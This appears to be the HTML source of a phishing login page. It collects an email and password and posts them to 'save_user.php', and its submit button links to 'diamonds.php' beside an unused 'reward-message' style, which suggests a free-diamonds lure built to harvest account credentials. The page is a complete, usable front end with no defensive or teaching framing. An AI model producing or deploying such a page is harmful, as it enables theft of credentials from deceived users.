<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
   
         <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: url('https://i.ibb.co/XjSPSpQ/images-9.jpg') no-repeat;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }
        
        .login-container {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            text-align: center;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.5);
           
        }

        .login-container h2 {
            color: white;
            margin-bottom: 20px;
        }

        .login-container label {
            display: block;
            font-weight: bold;
            color: white;
            margin: 10px 5px;
        }

        .login-container input[type="text"],
        .login-container input[type="email"],
        .login-container input[type="password"] {
            width: 90%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            margin-bottom: 15px;
        }

        .login-container button {
            background-color: #FF4500;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
        }

        .login-container button:hover {
            background-color: #FF6347;
        }

        .reward-message {
            color: #00FF00;
            font-weight: bold;
            margin-top: 20px;
        }

    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form action="save_user.php" method="POST">
            <label for="username">Email:</label>
            <input type="email" id="username" name="username" required>
            
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            
            <a href="diamonds.php"><button type="submit">Submit</button></a>
        </form>
    </div>
</body>
</html>